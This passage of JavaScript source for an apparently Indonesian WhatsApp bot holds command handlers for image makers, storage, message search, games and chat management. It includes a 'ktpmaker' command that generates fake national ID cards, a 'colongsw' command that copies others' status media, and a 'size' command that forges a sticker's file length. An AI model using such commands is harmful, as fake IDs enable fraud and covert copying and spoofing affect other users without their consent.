                   sendImageMaker(tahta, tahtah, sender)
                  await  limitAdd(sender, limit)
                  break
       case 'ytgold':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   ytgold = await getBuffer(`${ApiZeks}/api/gplaybutton?text=${F}&apikey=${zeksApikey}`)
                   ytgoldp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(ytgold, ytgoldp, sender)
                   await  limitAdd(sender, limit)
                   break  
       case 'ytsilver':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   ytsilver = await getBuffer(`${ApiZeks}/api/splaybutton?text=${F}&apikey=${zeksApikey}`)
                   ytsilverp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(ytsilver, ytsilverp, sender)
                   await  limitAdd(sender, limit)
                   break              
     case 'nulis':
									reply(`*Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
									break
						case 'nuliskiri':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'22',
									'-interline-spacing',
									'2',
									'-annotate',
									'+140+153',
									fixHeight,
									'./media/nulis/images/buku/setelahkiri.jpg'
									])
									.on('error', () => reply(lang.tryAgain()))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'nuliskanan':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'2',
									'-annotate',
									'+128+129',
									fixHeight,
									'./media/nulis/images/buku/setelahkanan.jpg'
									])
									.on('error', () => reply(lang.tryAgain()))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokiri':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'1720x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'4',
									'-annotate',
									'+48+185',
									fixHeight,
									'./media/nulis/images/folio/setelahkiri.jpg'
									])
									.on('error', () => reply(lang.tryAgain()))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokanan':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'3',
									'-annotate',
									'+89+190',
									fixHeight,
									'./media/nulis/images/folio/setelahkanan.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
									})
									}
									break      
       case 'ttp':  
                    if (args.length < 1) return reply(lang.noteks(prefix, command))
                    ttp = args.join(' ')
                    anu1 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${ttp}`)
                    alpha.sendMessage(from, anu1, image, {quoted: mek, caption : '.stikerin'})
					.catch(e =>{
					reply(lang.tryAgain())})
					 await limitAdd(sender, limit)
					break   
         case 'attp':  
                    if (args.length < 1) return reply(lang.noteks(prefix, command))
                    hhhh = q
                    anu1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${hhhh}`)
                    alpha.sendMessage(from, anu1, sticker, {quoted: mek})
					.catch(e =>{
					reply(lang.tryAgain())})
                    await limitAdd(sender, limit)
					break   
             case 'ktpmaker': case 'ktp':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|LoL Human|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    reply('waitt')
                    bikin = (`https://ferdiz-afk.my.id//api/maker/ktp?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gdarah=-&almt=${jl}&rt-rw=${rtrw}&kel=${lurah}&kcmtn=${camat}&agma=${agama}&status=${nikah}&kerja=${kerja}&negara=${warga}&berlaku=${until}&prov=${prov}&kab=${kabu}&picurl=${img}`)
                      console.log(bikin)
                    imge = await getBuffer(bikin)
                    await alpha.sendMessage(from, imge, image, { thumbnail: Buffer.alloc(0), quoted: mek });
                    await limitAdd(sender, limit)
					break 
        case 'nulis2':
if (args.length < 1) return reply(`*Usage*: ${prefix + command} nama&kelas&nomor&kata\n*Example*: ${prefix + command} udin&20&17&blablabla`)
var bodi = args.join(" ")
var nama = bodi.split("&")[0];
var kelas = bodi.split("&")[1];
var no = bodi.split("&")[2];
var aksarane = bodi.split("&")[3];
reply('membuat bos...')
                 rakz = await getBuffer(`https://ferdiz-afk.my.id//api/tulis?nama=${nama}&no=${no}&kelas=${kelas}&text=${aksarane}`)
                 alpha.sendMessage(from, rakz, image, { quoted: mek ,thumbnail: Buffer.alloc(0) });
await limitAdd(sender, limit)
					break   
              /*
              ]----------------------------------------------------------------> STORAGE <----------------------------------------------------------------[
              */
	        case 'addstik':
	if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedSticker) return fakestatus('Reply stiker')
					nm = body.slice(9)
					if (!nm) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(boij)
					setiker.push(`${nm}`)
					fs.writeFileSync(`./media/sticker/${nm}.webp`, delb)
					fs.writeFileSync('./temp/stik.json', JSON.stringify(setiker))
					fakegroup(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
					break
	      case 'liststik':
	      case 'liststiker':
	      case 'liststc':
					teks = '*Sticker list :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
					
			case 'addimg':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedImage) return fakegroup('```Reply imagenya```')
					clara = body.slice(8)
					if (!clara) return fakegroup('```Nama imagenya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./media/foto/${svst}.jpg`, delb)
					fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
					fakegroup(`Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`)
					break
			case 'listimg':
					teks = '*Image list :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama foto/image_`
					fakegroup(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
			case 'addvid':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedVideo) return fakegroup('```Reply vidionya```')
					svst = body.slice(8)
					if (!svst) return fakegroup('```Nama vidionya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./media/video/${svst}.mp4`, delb)
					fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
					fakegroup(`Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`)
					break
	        case 'listvid':
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}* \n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama video_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
			
			case 'addvn':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedAudio) return fakegroup('```Reply vnnya```')
					svst = body.slice(7)
					if (!svst) return reply('```Nama audionya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./media/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
					fakegroup( `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
					break
           
			case 'listvn':
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama audio_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break
			case 'addrespon':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if(!q) return reply(`ketik perintah ${prefix + command} filter|jawab!`)
					fltr = q.split('|')[0]
					jwb = q.split('|')[1]
					if(!jwb) return reply('Format salah!')
					for(let i of filter){
					  if(fltr.includes(i.Filter)) return reply(`Filter ${fltr} sudah ada didatabase`)
					}
					const chat = {
					Filter : fltr,
					Jawaban : jwb
					}
					filter.push(chat)
					fs.writeFileSync('./src/filter.json', JSON.stringify(filter))
					reply(`Sukses menambahkan filter ${fltr}\nCek dengan cara ${prefix}listchatrespon`)
					break
					
			case 'delrespon':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					for(let i=0; i<filter.length; i++){
					if(q.includes(filter[i].Filter)){
					   obj = {
					      txt: filter[i].text,
					      balesan: filter[i].balesan
					   }
					   let del = filter.indexOf(filter[i])
					   filter.splice(del, 1)
					   fs.writeFileSync('./src/filter.json', JSON.stringify(filter))
					   reply(`Sukses Menghapus Respon ${q}`)
					}
					}
					break
case 'listrespon':
   teks = 'List Respon:\n'
   for (let i of filter) {
   teks += `• Filter : ${i.Filter}\n• Jawab : ${i.Jawaban}\n---------------------------\n`
   }
   teks += `Total : ${filter.length}`
   alpha.sendMessage(from, teks.trim(), extendedText, {quoted: mek})
   break
		case 'caripesan2':
            if(!q)return reply('Masukkan pesan yg mau di cari')
            let v = await alpha.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await alpha.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            await limitAdd(sender, limit)
					break   
     case 'searchmsg':  
             if (args.length < 1) return reply(`Pesan Yang Mau Dicari Apaan?\nContoh : ${command} halo|10`)
             teks = arg
             if (teks.includes("|")) { 
             try {
             var ve = teks.split("|")[0]
             var za = teks.split("|")[1]
             sampai = `${za}`
             if (isNaN(sampai)) return reply('Harus berupa Angka!')
             batas = parseInt(sampai) + 1
             if (batas > 20) return reply('Maks 20!')
             reply(lang.wait())
             cok = await nino.searchMessages(`${ve}`, from, batas,1) 
             if (cok.messages.length < 2) return reply('Tidak Ditemukan Pesan') 
             if (cok.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)
             for (i=1;i < cok.messages.length;i++) {
             if (cok.messages[i].message) {
             alpha.sendMessage(from, `Ditemukan!`, text, {sendEphemeral: true, quoted: cok.messages[i]}) 
			}
			}
             } catch (e) {
             return reply(String(e))}
             } else {
             reply(`Format salah, format yang benar : ${command} halo|10`)}
             await limitAdd(sender, limit)
					break   
    case 'hash':
                try {
                if (!isQuotedSticker) return reply('Reply Sticker!')
                const encmeds = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                const mediastick = await alpha.downloadMediaMessage(encmeds)
                var crypto = require('crypto')
                hash = crypto.createHash('sha256').update(mediastick).digest('base64');
                console.log(hash)
                reply (hash)
                } catch {
                	reply(`reply stiker dengan command ${prefix}hash`)
	}
            await limitAdd(sender, limit)
					break   
    case 'delvote':
            if(!isGroupAdmins && !mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlygcAdmin())
            if(isVote) return reply(lang.noSesiVote())
            delVote(from)
            reply(lang.suksesDelVot())
            break
    case 'voting':
            if(!isGroupAdmins && !mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlygcAdmin())
            if(!isGroup) return reply(lang.onlygc())
            if (isVote) return reply(lang.adaVoting())
            if(!q) return reply(lang.caraVoting())
            if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || mek.message.extendedTextMessage.contextInfo == null) {
            let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply(lang.caraVot(prefix, command))
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            await limitAdd(sender, limit)
					break   
		case 'jadibot':
			//    if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.callOwner())
			//    jadibot(reply,alpha,from)
			var jadibdj = await getBuffer('https://telegra.ph/file/18be96b6415ea8833dbe5.jpg')
							sendButLocation(from, jadibut() , `Jangan klik doang 〽️ ${enter}${enter}${botname}™© | By ${ownername}`,jadibdj,  [{"buttonId": `payment`,"buttonText": {"displayText": "PAYMENT"},"type": "RESPONSE"}], {})
							await limitAdd(sender, limit)
					break   
		case 'stopjadibot':
			    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			    stopjadibot(reply)
			    break
		case 'listbot':
			    let tekss = '「 *LIST JADIBOT* 」\n'
			    for(let i of listjadibot) {
			    tekss += `*Number* : ${i.jid.split('@')[0]}
*Name* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
			    }
			    reply(tekss)
		case 'addcmd': 
       case 'setcmd':
              if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
              if (isQuotedSticker) {
              if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, q)
              reply(lang.success())
              } else {
              reply('Reply stickenya')
}
              break
       case 'delcmd':
              if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
              if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
            scommand.splice(getCommandPosition(kodenya), 1)
              fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
              reply(lang.success())
              break
       case 'listcmd':
              let teksnyee = `「 *LIST STICKER CMD* 」`
              let cemde = [];
              for (let i of scommand) {
              cemde.push(i.id)
              teksnyee += `\n\n📍 *ID :* ${i.id}\n📍 *Cmd* : ${i.chats}`
}
              mentions(teksnyee, cemde, true)
              break
      case 'delttt':
case 'delttc':
               if (!isGroup) return reply(lang.onlygc())
              // if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
               delete tictactoe[senderNumber]
fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
reply(lang.suksesDelTtt())
}
               break
        case 'cekhistory':
reply(` S T A T U S  T I C T A C T O E ${enter}•> Win : ${checkWin(sender)}${enter}•> Lose : ${checkLose(sender)}`)
break
case 'delsesi':
if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply('Hanya bisa didelete oleh admin group dan owner bot')
if (args[0] === 'ttt') {
delete tictactoe[senderNumber]
fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
reply(lang.noSesiTtt())
}
} else if (args[0] === 'vote') {
if(isVote) return reply(lang.noSesiVote())
            delVote(from)
            reply(lang.sukseDelVot())
} else {
	reply(`${prefix + command}delsesi ttt atau vote`)
}
break

case 'tictactoe':
case 'ttt':
if (!isGroup)return reply('*Khusus group*')
if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
if (fs.existsSync(`./temp/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan${enter}Ketik *${prefix}delsesi ttt*, untuk menghapus sesi`)
if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
tttSkuy = setTtt(`${from}`)
tttSkuy.status = false
tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
tttSkuy.Y = args[0].replace("@", "");
fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
starGame = `「 *MEMULAI GAME TICTACTOE* 」${enter}${enter}•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe ${enter}[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan${enter}${enter}`
alpha.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
await limitAdd(sender, limit)
					break   
             case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await alpha.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:mek})
alpha.relayWAMessage(costick)
await limitAdd(sender, limit)
					break   
case "colongsw": 
        if (!mek.key.fromMe) return
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await alpha.downloadAndSaveMediaMessage(ger);
          alpha.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await alpha.downloadAndSaveMediaMessage(ger);
          alpha.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong")
        }
        break
       case "listonline": 
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        try {
          let online = [
            ...Object.keys(alpha.chats.get(id).presences),
            alpha.user.jid,
          ];
          alpha.reply(
            m.chat,
            "「 L I S T   O N L I N E  」\n" +
              online.map((v) => "├ @" + v.replace(/@.+/, "")).join`\n` +
              "\n",
            m,
            {
              contextInfo: { mentionedJid: online },
            }
          );
        } catch (e) {
          m.reply("");
        }
        break;
        case 'getname':
 try {
getnem = alpha.getName(mek.quoted.sender)
reply(`${getnem}`)
} catch {
	reply ('Reply pesan @user')
	}
await limitAdd(sender, limit)
					break   
case 'linkgrup':
case 'linkgroup':
				case 'linkgc':
				    if (!isGroup) return reply(lang.onlygc())
				    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				    linkgc = await alpha.groupInviteCode (from)
				    yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
				    alpha.sendMessage(from, yeh, text, {quoted: mek})
			        await limitAdd(sender, limit)
					break   
		case 'unpin':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                alpha.modifyChat(from, ChatModification.unpin)
                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                break
        case 'pin':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                alpha.modifyChat(from, ChatModification.pin)
                reply('*succes pin this chat*')
                console.log('pinned chat = ' + from)
                break
         case 'unreadall':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                var chats = await alpha.chats.all()
                chats.map( async ({ jid }) => {
                await alpha.chatRead(jid, 'unread')
                    })
		    reply(`\`\`\`Successfully unread ${chats.length} chats !\`\`\``)
		    console.log(chats.length)
	        break
	        
            case 'readall':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                var chats = await alpha.chats.all()
                chats.map( async ({ jid }) => {
                await alpha.chatRead(jid)
                })
		reply(`\`\`\`Successfully read ${chats.length} chats !\`\`\``)
	      console.log(chats.length)
		break
		case 'unarchiveall':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                reply('*succes unarchive all chat*')
                console.log('succes unarchive chat = ' + from)
                anu = await alpha.chats.all()
                for (let _ of anu) {
                alpha.modifyChat(_.jid, ChatModification.unarchive)
                }
                break
                
            case 'archive':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                reply(lang.wait())
                console.log('succes archive chat = ' + from)
                await sleep(3000)
                alpha.modifyChat(from, ChatModification.archive)
                break
           case 'delthischat':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                console.log('succes delete chat = ' + from)
                await sleep(4000)
                await alpha.modifyChat(from, ChatModification.delete)
                reply('*succes delete this chat*')
                break
            case 'ssweb':
            case 'ss':
                if (args.length < 1) return reply('Urlnya mana om')
					teks = q
					anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
					buff = await getBuffer(anu.screenshot)
					alpha.sendMessage(from, buff, image, {quoted: mek, caption : teks})
					await limitAdd(sender, limit)
					break   
			case 'artinama':
                if (args.length < 1) return reply('Apa yang mau dicari um?')
                teks = q
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/arti?nama=${teks}`, {method: 'get'})
					reply(`Arti Nama ${teks}\n\n`+anu.result)
				await limitAdd(sender, limit)
					break   
			case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
ter = command[1].toLowerCase()
  tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
 reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
 await limitAdd(sender, limit)
					break   
 case 'getexif':
try {
    if (!m.quoted) return reply('Tag stikernya!')
    cok = { message: { [m.quoted.mtype]: m.quoted } }
    if (/sticker/.test(m.quoted.mtype)) {
        let img = new webp.Image()
        await img.loadBuffer(await m.quoted.download())
        reply(util.format(JSON.parse(img.exif.slice(22).toString())))
    }
    } catch (e) {
    	throw e
    reply(String(e))
    }
    await limitAdd(sender, limit)
					break   
		case 'afk':
			if (!isGroup) return reply(lang.onlygc())
            if (isAfkOn) return 
                reason = q ? q : 'Nothing'
                off.addAfkUser(sender, Date.now(), reason, _off)
               papa =  `*${pushname}* Sekarang sedang Afk\n*Reason :* ${reason}\n`
                alpha.sendMessage(from,papa, text,{quoted : mek})
            break
        case 'autoread':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return reply(lang.anjawaUdhOn(command))
readGc = true
reply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return reply(lang.anjawaUdhOn(command))
readPc = true
reply(`Succes mengaktifkan autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
reply(`Succes mematikan autoread pc`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break
case 'nsfw':
					    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
						if (!isGroup) return reply(lang.onlygc()) 
						if (args.length < 1) return reply(lang.anjawaUdhOon(command))
						if (args[0] === 'on') {
						if (isNsfw) return reply(lang.anjawaUdhOn(command))
						_nsfw.push(from)
						fs.writeFileSync('./src/nsfw.json', JSON.stringify(_nsfw))
						reply(lang.anjawaOn(command))
						} else if (args[0] === 'off') {
						_nsfw.splice(from, 1)
						fs.writeFileSync('./src/nsfw.json', JSON.stringify(_nsfw))
						reply(lang.anjawaOff(command))
						} else if (!q) {
          sendButMessage(from, `MODE NSFW`, `Choose one`, [
            {
              buttonId: 'nsfw on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'nsfw off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'antibug':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          if (args[0] === 'on') {
          if (bugc === true) return reply(lang.anjawaUdhOn(command))
          bugc = true
          antitrol = true
          reply(lang.anjawaOn(command))
          } else if (args[0] === 'off') {
          if (bugc === false) return
          bugc = false
          antitrol = false
          reply(lang.anjawaOff(command))
          } else if (!q) {
          sendButMessage(from, `MODE ANTIBUG`, `Choose one`, [
            {
              buttonId: 'antibug on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antibug off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
          case 'antidelete':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (antidel === true) return reply(lang.anjawaUdhOn(command))
antidel = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (antidel === false) return
antidel = false
